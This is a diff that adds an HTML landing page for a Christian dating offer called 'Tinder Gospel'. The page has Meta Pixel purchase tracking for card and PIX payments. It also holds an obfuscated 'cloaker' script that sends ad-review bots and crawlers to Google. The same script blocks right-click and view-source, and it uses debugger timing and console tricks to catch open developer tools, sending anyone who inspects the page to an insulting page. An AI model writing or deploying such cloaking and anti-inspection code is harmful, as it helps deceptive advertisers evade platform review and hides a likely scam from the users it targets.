@@ -1,0 +1,129 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tinder Gospel - Encontre Seu Par com Propósito</title>
+  <meta name="description" content="Conecte-se com pessoas de fé da sua região. Descubra relacionamentos baseados em valores cristãos e propósito divino.">
+  <meta name="author" content="Tinder Gospel">
+
+  <meta property="og:title" content="Tinder Gospel - Encontre Seu Par com Propósito">
+  <meta property="og:description" content="Conecte-se com pessoas de fé da sua região. Descubra relacionamentos baseados em valores cristãos e propósito divino.">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="images/etapa1.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@tindergospel">
+  <meta name="twitter:image" content="images/etapa1.png">
+
+  <!-- Meta Pixel Code -->
+  <script>
+    !function (f, b, e, v, n, t, s) {
+      if (f.fbq) return; n = f.fbq = function () {
+        n.callMethod ?
+          n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+      };
+      if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+      n.queue = []; t = b.createElement(e); t.async = !0;
+      t.src = v; s = b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t, s)
+    }(window, document, 'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1828227174620781');
+    fbq('track', 'PageView');
+  </script>
+  <script type="module" crossorigin="" src="js/index-KPK4THMG.js"></script>
+  <link rel="stylesheet" crossorigin="" href="css/index-DAecF6lK.css">
+</head>
+
+<body>
+  <div id="root"></div>
+
+  <noscript>
+    <img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1828227174620781&ev=PageView&noscript=1" />
+  </noscript>
+
+
+  <!-- Função para enviar evento Purchase com eventID e valor dinâmico -->
+  <script>
+    function gerarEventID() {
+      return 'evento_' + Date.now();
+    }
+
+    function enviarEventoPurchase(valorCompra, metodoPagamento) {
+  const eventID = gerarEventID();
+
+  // Conversão segura do valor (remove R$, vírgula, espaços e força para número com ponto)
+  let valorFormatado = parseFloat(
+    String(valorCompra).replace(/[^\d,.-]/g, '').replace(',', '.')
+  );
+
+  // Evita valores inválidos ou nulos
+  if (isNaN(valorFormatado) || valorFormatado <= 0) {
+    console.warn('Valor de compra inválido:', valorCompra);
+    return;
+  }
+
+  fbq('track', 'Purchase', {
+    value: valorFormatado,
+    currency: 'BRL'
+  }, {
+    eventID: eventID
+  });
+
+  if (metodoPagamento === 'Cartão de Crédito') {
+    fbq('trackCustom', 'credit_card', { metodo: metodoPagamento }, { eventID: eventID });
+  } else if (metodoPagamento === 'PIX') {
+    fbq('trackCustom', 'pix_gerado', { metodo: metodoPagamento }, { eventID: eventID });
+  }
+
+  // Aqui você pode enviar o eventID para seu backend, se desejar
+}
+
+  </script>
+
+  <!-- CLOAKER OFUSCADO ATUALIZADO -->
+  <script>
+    (function () {
+      const u = "https://www.dicionarioinformal.com.br/safado/";
+      const f = "https://www.google.com/";
+      const b = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i, /facebot/i, /ia_archiver/i, /bingpreview/i, /googlebot/i, /adsbot/i, /mediapartners/i, /duckduckbot/i, /slurp/i, /yandex/i, /twitterbot/i];
+
+      if (b.some(p => p.test(navigator.userAgent))) location.href = f;
+
+      if (window !== window.top) window.top.location = window.location;
+
+      document.addEventListener("contextmenu", e => e.preventDefault());
+
+      document.addEventListener("keydown", function (e) {
+        const k = e.key.toLowerCase();
+        if (e.key === "F12" || (e.ctrlKey && k === "u") || (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(k))) {
+          e.preventDefault();
+          location.href = u;
+          return false;
+        }
+      });
+
+      (function d() {
+        const s = performance.now();
+        debugger;
+        const t = performance.now() - s;
+        t > 100 ? location.href = u : requestAnimationFrame(d);
+      })();
+
+      (function () {
+        let o = false;
+        const i = new Image();
+        Object.defineProperty(i, "id", {
+          get: function () { o = true; }
+        });
+        setInterval(() => {
+          o = false;
+          console.log(i);
+          if (o) location.href = u;
+        }, 1000);
+      })();
+    })();
+  </script>
+
+
+</body></html>
